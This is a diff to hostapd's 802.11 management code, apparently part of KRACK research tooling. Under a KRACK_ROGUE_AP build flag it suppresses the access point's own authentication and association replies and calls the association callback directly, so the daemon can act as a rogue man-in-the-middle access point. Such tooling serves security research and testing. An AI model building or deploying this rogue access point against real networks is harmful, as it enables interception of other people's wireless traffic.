@@ -46,6 +46,11 @@
 #include "rrm.h"
 #include "taxonomy.h"
 
+#include "common/attacks.h"
+
+static void handle_assoc_cb(struct hostapd_data *hapd,
+			    const struct ieee80211_mgmt *mgmt,
+			    size_t len, int reassoc, int ok);
 
 u8 * hostapd_eid_supp_rates(struct hostapd_data *hapd, u8 *eid)
 {
@@ -288,6 +293,9 @@ static int send_auth_reply(struct hostapd_data *hapd,
 	if (ies && ies_len)
 		os_memcpy(reply->u.auth.variable, ies, ies_len);
 
+#ifdef KRACK_ROGUE_AP
+	printf(">>> %s: not sending own authentication reply\n", __FUNCTION__);
+#else
 	wpa_printf(MSG_DEBUG, "authentication reply: STA=" MACSTR
 		   " auth_alg=%d auth_transaction=%d resp=%d (IE len=%lu)",
 		   MAC2STR(dst), auth_alg, auth_transaction,
@@ -295,6 +303,7 @@ static int send_auth_reply(struct hostapd_data *hapd,
 	if (hostapd_drv_send_mlme(hapd, reply, rlen, 0) < 0)
 		wpa_printf(MSG_INFO, "send_auth_reply: send failed");
 	else
+#endif
 		reply_res = WLAN_STATUS_SUCCESS;
 
 	os_free(buf);
@@ -2372,11 +2381,16 @@ static u16 send_assoc_resp(struct hostapd_data *hapd, struct sta_info *sta,
 	}
 #endif /* CONFIG_FILS */
 
+#ifdef KRACK_ROGUE_AP
+	printf(">>> %s: not sending association reply (status=%d)\n", __FUNCTION__, status_code);
+	handle_assoc_cb(hapd, reply, send_len, 0, 1);
+#else
 	if (hostapd_drv_send_mlme(hapd, reply, send_len, 0) < 0) {
 		wpa_printf(MSG_INFO, "Failed to send assoc resp: %s",
 			   strerror(errno));
 		return WLAN_STATUS_UNSPECIFIED_FAILURE;
 	}
+#endif
 
 	return WLAN_STATUS_SUCCESS;
 }
@@ -3144,7 +3158,6 @@ static void hostapd_set_wds_encryption(struct hostapd_data *hapd,
 		}
 	}
 }
-
 
 static void handle_assoc_cb(struct hostapd_data *hapd,
 			    const struct ieee80211_mgmt *mgmt,
